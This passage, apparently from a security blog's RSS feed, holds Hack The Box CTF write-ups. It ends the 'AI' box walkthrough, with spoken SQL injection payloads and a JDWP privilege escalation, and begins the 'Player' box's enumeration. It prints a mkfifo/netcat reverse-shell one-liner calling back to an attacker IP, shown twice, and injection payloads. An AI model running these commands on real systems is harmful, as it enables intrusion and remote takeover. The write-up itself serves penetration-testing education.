class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;AI&#x2F;test#</span><br></pre></td></tr></table></figure><p><img src="/images/hackthebox/ai/6.png" alt=""></p><p><img src="/images/hackthebox/ai/7.png" alt=""></p><h2 id="SQL-injection-–-gt-Alexa’s-Credentials-–-gt-SSH-as-Alexa-–-gt-User-Flag"><a href="#SQL-injection-–-gt-Alexa’s-Credentials-–-gt-SSH-as-Alexa-–-gt-User-Flag" class="headerlink" title="SQL injection –&gt; Alexa’s Credentials –&gt; SSH as Alexa –&gt; User Flag"></a>SQL injection –&gt; Alexa’s Credentials –&gt; SSH as Alexa –&gt; User Flag</h2><p>As I said earlier, we don’t know what does it mean by “query” but it can be a <code>SQL</code> query. When I created another audio file that says <code>it&#39;s a test</code> I got a <code>SQL</code> error because of <code>&#39;</code> in <code>it&#39;s</code>:<br><img src="/images/hackthebox/ai/8.png" alt=""><br>The injection part was the hardest part of this box because it didn’t process the audio files correctly most of the time, and it took me a lot of time to get my payloads to work.<br>First thing I did was to get the database name.<br>Payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">one open single quote union select database open parenthesis close parenthesis comment database</span><br></pre></td></tr></table></figure><p><img src="/images/hackthebox/ai/9.png" alt=""><br>The database name was <code>alexa</code>, next thing I did was enumerating table names, my payload was like the one shown below and I kept changing the <code>test</code> after <code>from</code> and tried possible and common things.<br>Payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">one open single quote union select test from test comment database</span><br></pre></td></tr></table></figure><p><img src="/images/hackthebox/ai/10.png" alt=""><br>The table <code>users</code> existed.<br>Payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">one open single quote union select test from users comment database</span><br></pre></td></tr></table></figure><p><img src="/images/hackthebox/ai/11.png" alt=""><br>From here it was easy to guess the column names, <code>username</code> and <code>password</code>. The problem with <code>username</code> was that it processed <code>user</code> and <code>name</code> as two different words so I couldn’t make it work.<br>Payload: </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">one open single quote union select username from users comment database</span><br></pre></td></tr></table></figure><p><img src="/images/hackthebox/ai/12.png" alt=""><br><code>password</code> worked just fine.<br>Payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">one open single quote union select password from users comment database</span><br></pre></td></tr></table></figure><p><img src="/images/hackthebox/ai/13.png" alt=""><br>Without knowing the username we can’t do anything with the password, I tried <code>alexa</code> which was the database name and it worked:<br><img src="/images/hackthebox/ai/14.png" alt=""><br>We owned user.</p><h2 id="JDWP-–-gt-Code-Execution-–-gt-Root-Shell-–-gt-Root-Flag"><a href="#JDWP-–-gt-Code-Execution-–-gt-Root-Shell-–-gt-Root-Flag" class="headerlink" title="JDWP –&gt; Code Execution –&gt; Root Shell –&gt; Root Flag"></a>JDWP –&gt; Code Execution –&gt; Root Shell –&gt; Root Flag</h2><p>Privilege escalation on this box was very easy, when I checked the running processes I found this one:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">alexa@AI:~$ ps aux</span><br><span class="line">USER        PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND</span><br><span class="line">----------</span><br><span class="line"> REDACTED</span><br><span class="line">----------</span><br><span class="line">root      89984 18.8  5.4 3137572 110120 ?      Sl   22:44   0:06 &#x2F;usr&#x2F;bin&#x2F;java -Djava.util.logging.config.file&#x3D;&#x2F;opt&#x2F;apache-tomcat-9.0.27&#x2F;conf&#x2F;logging.properties -Djava.util.logging.manager&#x3D;org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize&#x3D;2048 -Djava.protocol.handler.pkgs&#x3D;org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK&#x3D;0027 -agentlib:jdwp&#x3D;transport&#x3D;dt_socket,address&#x3D;localhost:8000,server&#x3D;y,suspend&#x3D;n -Dignore.endorsed.dirs&#x3D; -classpath &#x2F;opt&#x2F;apache-tomcat-9.0.27&#x2F;bin&#x2F;bootstrap.jar:&#x2F;opt&#x2F;apache-tomcat-9.0.27&#x2F;bin&#x2F;tomcat-juli.jar -Dcatalina.base&#x3D;&#x2F;opt&#x2F;apache-tomcat-9.0.27 -Dcatalina.home&#x3D;&#x2F;opt&#x2F;apache-tomcat-9.0.27 -Djava.io.tmpdir&#x3D;&#x2F;opt&#x2F;apache-tomcat-9.0.27&#x2F;temp org.apache.catalina.startup.Bootstrap start</span><br><span class="line">----------</span><br><span class="line"> REDACTED</span><br><span class="line">----------</span><br><span class="line">alexa@AI:~$</span><br></pre></td></tr></table></figure><p>This was related to an <code>Apache Tomcat</code> server that was running on <code>localhost</code>, I looked at that server for about 10 minutes but it was empty and I couldn’t do anything there, it was a rabbit hole. If we check the listening ports we’ll see <code>8080</code>, <code>8005</code> and <code>8009</code> which is perfectly normal because these are the ports used by <code>tomcat</code>, but we’ll also see <code>8000</code>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">alexa@AI:~$ netstat -ntlp</span><br><span class="line">(Not all processes could be identified, non-owned process info</span><br><span class="line"> will not be shown, you would have to be root to see it all.)</span><br><span class="line">Active Internet connections (only servers)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID&#x2F;Program name    </span><br><span class="line">tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -</span><br><span class="line">tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -</span><br><span class="line">tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -</span><br><span class="line">tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -</span><br><span class="line">tcp6       0      0 127.0.0.1:8080          :::*                    LISTEN      -</span><br><span class="line">tcp6       0      0 :::80                   :::*                    LISTEN      -</span><br><span class="line">tcp6       0      0 :::22                   :::*                    LISTEN      -</span><br><span class="line">tcp6       0      0 127.0.0.1:8005          :::*                    LISTEN      -</span><br><span class="line">tcp6       0      0 127.0.0.1:8009          :::*                    LISTEN      -</span><br><span class="line">alexa@AI:~$</span><br></pre></td></tr></table></figure><p>A quick search on that port and how it’s related to <code>tomcat</code> revealed that it’s used for debugging, <code>jdwp</code> is running on that port.</p><blockquote><p>The Java Debug Wire Protocol (JDWP) is the protocol used for communication between a debugger and the Java virtual machine (VM) which it debugs (hereafter called the target VM). -<a href="https://docs.oracle.com/javase/8/docs/technotes/guides/jpda/jdwp-spec.html" target="_blank" rel="noopener">docs.oracle.com</a></p></blockquote><p>By looking at the process again we can also see this parameter given to the <code>java</code> binary:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-agentlib:jdwp&#x3D;transport&#x3D;dt_socket,address&#x3D;localhost:8000</span><br></pre></td></tr></table></figure><p>I searched for exploits for the <code>jdwp</code> service and found <a href="https://github.com/IOActive/jdwp-shellifier" target="_blank" rel="noopener">this exploit</a>. I uploaded the python script on the box and I added the reverse shell payload to a file and called it <code>pwned.sh</code> then I ran the exploit:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">alexa@AI:&#x2F;dev&#x2F;shm$ nano pwned.sh </span><br><span class="line">alexa@AI:&#x2F;dev&#x2F;shm$ chmod +x pwned.sh </span><br><span class="line">alexa@AI:&#x2F;dev&#x2F;shm$ cat pwned.sh </span><br><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 10.10.xx.xx 1337 &gt;&#x2F;tmp&#x2F;f</span><br><span class="line">alexa@AI:&#x2F;dev&#x2F;shm$ python jdwp-shellifier.py -t 127.0.0.1 --cmd &#x2F;dev&#x2F;shm&#x2F;pwned.sh</span><br><span class="line">[+] Targeting &#39;127.0.0.1:8000&#39;</span><br><span class="line">[+] Reading settings for &#39;OpenJDK 64-Bit Server VM - 11.0.4&#39;</span><br><span class="line">[+] Found Runtime class: id&#x3D;b8c</span><br><span class="line">[+] Found Runtime.getRuntime(): id&#x3D;7f40bc03e790</span><br><span class="line">[+] Created break event id&#x3D;2</span><br><span class="line">[+] Waiting for an event on &#39;java.net.ServerSocket.accept&#39;</span><br></pre></td></tr></table></figure><p>Then from another <code>ssh</code> session I triggered a connection on port <code>8005</code>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alexa@AI:~$ nc localhost 8005</span><br></pre></td></tr></table></figure><p>And the code was executed:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">alexa@AI:&#x2F;dev&#x2F;shm$ nano pwned.sh </span><br><span class="line">alexa@AI:&#x2F;dev&#x2F;shm$ chmod +x pwned.sh </span><br><span class="line">alexa@AI:&#x2F;dev&#x2F;shm$ cat pwned.sh </span><br><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 10.10.xx.xx 1337 &gt;&#x2F;tmp&#x2F;f</span><br><span class="line">alexa@AI:&#x2F;dev&#x2F;shm$ python jdwp-shellifier.py -t 127.0.0.1 --cmd &#x2F;dev&#x2F;shm&#x2F;pwned.sh</span><br><span class="line">[+] Targeting &#39;127.0.0.1:8000&#39;</span><br><span class="line">[+] Reading settings for &#39;OpenJDK 64-Bit Server VM - 11.0.4&#39;</span><br><span class="line">[+] Found Runtime class: id&#x3D;b8c</span><br><span class="line">[+] Found Runtime.getRuntime(): id&#x3D;7f40bc03e790</span><br><span class="line">[+] Created break event id&#x3D;2</span><br><span class="line">[+] Waiting for an event on &#39;java.net.ServerSocket.accept&#39;</span><br><span class="line">[+] Received matching event from thread 0x1</span><br><span class="line">[+] Selected payload &#39;&#x2F;dev&#x2F;shm&#x2F;pwned.sh&#39;</span><br><span class="line">[+] Command string object created id:c31</span><br><span class="line">[+] Runtime.getRuntime() returned context id:0xc32</span><br><span class="line">[+] found Runtime.exec(): id&#x3D;7f40bc03e7c8</span><br><span class="line">[+] Runtime.exec() successful, retId&#x3D;c33</span><br><span class="line">[!] Command successfully executed</span><br><span class="line">alexa@AI:&#x2F;dev&#x2F;shm$</span><br></pre></td></tr></table></figure><p><img src="/images/hackthebox/ai/15.png" alt=""></p><p>And we owned root !<br>That’s it , Feedback is appreciated !<br>Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham" target="_blank" rel="noopener">@Ahm3d_H3sham</a><br>Thanks for reading.</p><p>Previous Hack The Box write-up : <a href="/hack-the-box/player/">Hack The Box - Player</a></p>]]></content:encoded>
      
      <comments>https://0xrick.github.io/hack-the-box/ai/#disqus_thread</comments>
    </item>
    
    <item>
      <title>Hack The Box - Player</title>
      <link>https://0xrick.github.io/hack-the-box/player/</link>
      <guid>https://0xrick.github.io/hack-the-box/player/</guid>
      <pubDate>Sat, 18 Jan 2020 03:00:00 GMT</pubDate>
      <description>
      
        My write-up / walkthrough for Player from Hack The Box.
      
      </description>
      
      
      <content:encoded><![CDATA[<h1 id="Hack-The-Box-Player"><a href="#Hack-The-Box-Player" class="headerlink" title="Hack The Box - Player"></a>Hack The Box - Player</h1><h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Quick Summary"></a>Quick Summary</h2><p>Hey guys, today Player retired and here’s my write-up about it. It was a relatively hard CTF-style machine with a lot of enumeration and a couple of interesting exploits. It’s a Linux box and its ip is <code>10.10.10.145</code>, I added it to <code>/etc/hosts</code> as <code>player.htb</code>. Let’s jump right in !</p><p><img src="/images/hackthebox/player/0.png" alt=""></p><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><p>As always we will start with <code>nmap</code> to scan for open ports and services:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;player# nmap -sV -sT -sC -o nmapinitial player.htb </span><br><span class="line">Starting Nmap 7.80 ( https:&#x2F;&#x2F;nmap.org ) at 2020-01-17 16:29 EST</span><br><span class="line">Nmap scan report for player.htb (10.10.10.145)</span><br><span class="line">Host is up (0.35s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.11 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 d7:30:db:b9:a0:4c:79:94:78:38:b3:43:a2:50:55:81 (DSA)</span><br><span class="line">|   2048 37:2b:e4:31:ee:a6:49:0d:9f:e7:e6:01:e6:3e:0a:66 (RSA)</span><br><span class="line">|   256 0c:6c:05:ed:ad:f1:75:e8:02:e4:d2:27:3e:3a:19:8f (ECDSA)</span><br><span class="line">|_  256 11:b8:db:f3:cc:29:08:4a:49:ce:bf:91:73:40:a2:80 (ED25519)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.7</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.7 (Ubuntu)</span><br><span class="line">|_http-title: 403 Forbidden</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 75.12 seconds</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;player#</span><br></pre></td></tr></table></figure><p>We got <code>http</code> on port 80 and <code>ssh</code> on port 22.</p><h2 id="Web-Enumeration"><a href="#Web-Enumeration" class="headerlink" title="Web Enumeration"></a>Web Enumeration</h2><p>I got a 403 response when I went to <code>http://player.htb/</code>:<br><img src="/images/hackthebox/player/1.png" alt=""><br>I used <code>wfuzz</code> with <a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/DNS/subdomains-top1million-5000.txt" target="_blank" rel="noopener"><code>subdomains-top1mil-5000.txt</code></a> from <a href="https://github.com/danielmiessler/SecLists" target="_blank" rel="noopener"><code>seclists</code></a> to enumerate virtual hosts and got these results:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;player# wfuzz --hc 403 -c -w subdomains-top1mil-5000.txt -H &quot;HOST: FUZZ.player.htb&quot; http:&#x2F;&#x2F;10.10.10.145</span><br><span class="line"></span><br><span class="line">Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#39;s documentation for more information.</span><br><span class="line"></span><br><span class="line">********************************************************</span><br><span class="line">* Wfuzz 2.4 - The Web Fuzzer                           *</span><br><span class="line">********************************************************</span><br><span class="line">Target: http:&#x2F;&#x2F;10.10.10.145&#x2F;</span><br><span class="line">Total requests: 4997</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">ID           Response   Lines    Word     Chars       Payload</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">000000019:   200        86 L     229 W    5243 Ch     &quot;dev&quot;</span><br><span class="line">000000067:   200        63 L     180 W    1470 Ch     &quot;staging&quot;</span><br><span class="line">000000070:   200        259 L    714 W    9513 Ch     &quot;chat&quot;</span><br><span class="line"></span><br><span class="line">Total time: 129.1540</span><br><span class="line">Processed Requests: 4997</span><br><span class="line">Filtered Requests: 4994</span><br><span class="line">Requests&#x2F;sec.: 38.69021</span><br><span class="line"></span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;player#</span><br></pre></td></tr></table></figure><p>I added them to my hosts file and started checking each one of them.<br>On <code>dev</code> there was an application that needed credentials so we’ll skip that one until we find some credentials:<br><img src="/images/hackthebox/player/2.png" alt=""><br><code>staging</code> was kinda empty but there was an interesting contact form:<br><img src="/images/hackthebox/player/3.png" alt=""></p><p><img src="/images/hackthebox/player/4.png" alt=""></p><p><img src="/images/hackthebox/player/5.png" alt=""><br>The form was interesting because when I attempted to submit it I got a weird error for a second then I got redirected to <code>/501.php</code>:<br><img src="/images/hackthebox/player/6.png" alt=""></p><p><img src="/images/hackthebox/player/7.png" alt=""><br>I intercepted the request with burp to read the error.<br>Request: </p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/contact.php?firstname=test&amp;subject=test</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: staging.player.htb</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span>: http://staging.player.htb/contact.html</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br></pre></td></tr></table></figure><p>Response:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">HTTP/<span class="number">1.1</span> <span class="number">200</span> OK</span><br><span class="line">Date: Fri, <span class="number">17</span> Jan <span class="number">2020</span> <span class="number">19</span>:<span class="number">54</span>:<span class="number">33</span> GMT</span><br><span class="line">Server: Apache/<span class="number">2.4</span><span class="number">.7</span> (Ubuntu)</span><br><span class="line">X-Powered-By: PHP/<span class="number">5.5</span><span class="number">.9</span><span class="number">-1</span>ubuntu4<span class="number">.26</span></span><br><span class="line">refresh: <span class="number">0</span>;url=<span class="number">501.</span>php</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">Content-Length: <span class="number">818</span></span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/html</span><br><span class="line"></span><br><span class="line"><span class="keyword">array</span>(<span class="number">3</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  <span class="keyword">array</span>(<span class="number">4</span>) &#123;</span><br><span class="line">    [<span class="string">"file"</span>]=&gt;</span><br><span class="line">    string(<span class="number">28</span>) <span class="string">"/var/www/staging/contact.php"</span></span><br><span class="line">    [<span class="string">"line"</span>]=&gt;</span><br><span class="line">    int(<span class="number">6</span>)</span><br><span class="line">    [<span class="string">"function"</span>]=&gt;</span><br><span class="line">    string(<span class="number">1</span>) <span class="string">"c"</span></span><br><span class="line">    [<span class="string">"args"</span>]=&gt;</span><br><span class="line">    <span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">      [<span class="number">0</span>]=&gt;</span><br><span class="line">      &amp;string(<span class="number">9</span>) <span class="string">"Cleveland"</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  [<span class="number">1</span>]=&gt;</span><br><span class="line">  <span class="keyword">array</span>(<span class="number">4</span>) &#123;</span><br><span class="line">    [<span class="string">"file"</span>]=&gt;</span><br><span class="line">    string(<span class="number">28</span>) <span class="string">"/var/www/staging/contact.php"</span></span><br><span class="line">    [<span class="string">"line"</span>]=&gt;</span><br><span class="line">    int(<span class="number">3</span>)</span><br><span class="line">    [<span class="string">"function"</span>]=&gt;</span><br><span class="line">    string(<span class="number">1</span>) <span class="string">"b"</span></span><br><span class="line">    [<span class="string">"args"</span>]=&gt;</span><br><span class="line">    <span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">      [<span class="number">0</span>]=&gt;</span><br><span class="line">      &amp;string(<span class="number">5</span>) <span class="string">"Glenn"</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  [<span class="number">2</span>]=&gt;</span><br><span class="line">  <span class="keyword">array</span>(<span class="number">4</span>) &#123;</span><br><span class="line">    [<span class="string">"file"</span>]=&gt;</span><br><span class="line">    string(<span class="number">28</span>) <span class="string">"/var/www/staging/contact.php"</span></span><br><span class="line">    [<span class="string">"line"</span>]=&gt;</span><br><span class="line">    int(<span class="number">11</span>)</span><br><span class="line">    [<span class="string">"function"</span>]=&gt;</span><br><span class="line">    string(<span class="number">1</span>) <span class="string">"a"</span></span><br><span class="line">    [<span class="string">"args"</span>]=&gt;</span><br><span class="line">    <span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">      [<span class="number">0</span>]=&gt;</span><br><span class="line">      &amp;string(<span class="number">5</span>) <span class="string">"Peter"</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">Database connection failed.&lt;html&gt;&lt;br /&gt;Unknown variable user in /<span class="keyword">var</span>/www/backup/service_config fatal error in /<span class="keyword">var</span>/www/staging/fix.php</span><br></pre></td></tr></table></figure><p>The error exposed some filenames like <code>/var/www/backup/service_config</code>, <code>/var/www/staging/fix.php</code> and <code>/var/www/staging/contact.php</code>. That will be helpful later.<br><code>chat</code> was a static page that simulated a chat application:<br><img src="/images/hackthebox/player/8.png" alt=""><br>I took a quick look at the chat history between Olla and Vincent, Olla asked him about some pentest reports and he replied with 2 interesting things :<br><img src="/images/hackthebox/player/9.png" alt=""></p><p><img src="/images/hackthebox/player/10.png" alt=""></p><ol><li>Staging exposing sensitive files.</li><li>Main domain exposing source code allowing to access the product before release.</li></ol><p>We already saw that <code>staging</code> was exposing files, I ran <code>gobuster</code> on the main domain and found <code>/launcher</code>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;player# gobuster dir -u http:&#x2F;&#x2F;player.htb&#x2F; -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb&#x2F;common.txt </span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span 